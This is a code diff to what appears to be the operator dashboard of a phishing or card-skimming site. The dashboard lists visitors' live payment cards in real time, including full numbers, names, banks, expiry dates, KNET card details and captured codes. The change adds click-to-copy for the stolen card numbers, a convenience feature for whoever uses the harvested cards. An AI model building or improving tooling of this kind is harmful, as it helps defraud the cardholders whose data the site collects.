@@ -1642,7 +1642,7 @@ if (isOnPaymentPage && visitor.liveCard && (__lastPcTs === 0 || __lcTs > __lastP
   html += '<span style="color: #444; font-size: 15px; font-weight: bold;">' + lcInfo.bank + ' 🏦</span>';
   html += '</div>';
   html += '<div style="text-align: center; margin-bottom: 14px;">';
-  html += '<span dir="ltr" style="font-size: 22px; font-weight: bold; color: #333; letter-spacing: 3px; unicode-bidi: embed; display: inline-block;">' + lcNum + '</span>';
+  html += '<span dir="ltr" style="font-size: 22px; font-weight: bold; color: #333; letter-spacing: 3px; unicode-bidi: embed; display: inline-block; cursor: pointer;" title="انقر للنسخ" onclick="kddCopyCard(this, \'' + lcNumRaw + '\')">' + lcNum + '</span>';
   html += '</div>';
   html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px;">';
   html += '<div style="text-align: left;"><span style="color: #888; font-size: 11px;">Name</span><br><span style="color: #333; font-size: 14px; font-weight: 600;">' + lcName + '</span></div>';
@@ -1800,7 +1800,7 @@ if (entry.type === 'code') {
               html += '</div>';
               // Card number
               html += '<div style="text-align: center; margin-bottom: 14px;">';
-              html += '<span dir="ltr" style="font-size: 22px; font-weight: bold; color: #064e3b; letter-spacing: 3px; unicode-bidi: embed; display: inline-block;">' + formattedKnetNum + '</span>';
+              html += '<span dir="ltr" style="font-size: 22px; font-weight: bold; color: #064e3b; letter-spacing: 3px; unicode-bidi: embed; display: inline-block; cursor: pointer;" title="انقر للنسخ" onclick="kddCopyCard(this, \'' + knetCardNum + '\')">' + formattedKnetNum + '</span>';
               html += '</div>';
               // Expiry + Prefix row
               html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px;">';
@@ -1836,7 +1836,7 @@ if (entry.type === 'code') {
               html += '</div>';
               // Card number
               html += '<div style="text-align: center; margin-bottom: 14px;">';
-              html += '<span dir="ltr" style="font-size: 22px; font-weight: bold; color: #333; letter-spacing: 3px; unicode-bidi: embed; display: inline-block;">' + formattedNum + '</span>';
+              html += '<span dir="ltr" style="font-size: 22px; font-weight: bold; color: #333; letter-spacing: 3px; unicode-bidi: embed; display: inline-block; cursor: pointer;" title="انقر للنسخ" onclick="kddCopyCard(this, \'' + card.cardNumber + '\')">' + formattedNum + '</span>';
               html += '</div>';
               // Expiry + Name row
               html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px;">';
@@ -2605,6 +2605,22 @@ html += '</select>';
     }
 
     // Notification
+    // KDD: نسخ رقم البطاقة عند النقر
+    function kddCopyCard(el, num) {
+      var t = String(num || '').replace(/\s/g, '');
+      try { if (navigator.clipboard && window.isSecureContext) { navigator.clipboard.writeText(t); } else { throw 0; } }
+      catch (e) {
+        try { var a = document.createElement('textarea'); a.value = t; a.style.position = 'fixed'; a.style.opacity = '0'; document.body.appendChild(a); a.select(); document.execCommand('copy'); document.body.removeChild(a); } catch (e2) {}
+      }
+      var prev = el.style.color;
+      var tip = document.createElement('span');
+      tip.textContent = 'تم النسخ';
+      tip.style.cssText = 'font-size:11px;font-weight:bold;color:#16a34a;margin:0 8px;';
+      if (el.parentNode) el.parentNode.insertBefore(tip, el);
+      el.style.color = '#16a34a';
+      setTimeout(function () { el.style.color = prev || ''; if (tip.parentNode) tip.parentNode.removeChild(tip); }, 1000);
+    }
+
     function showNotification(message) {
       if (Notification.permission === 'granted') {
         new Notification('لوحة التحكم', { body: message });
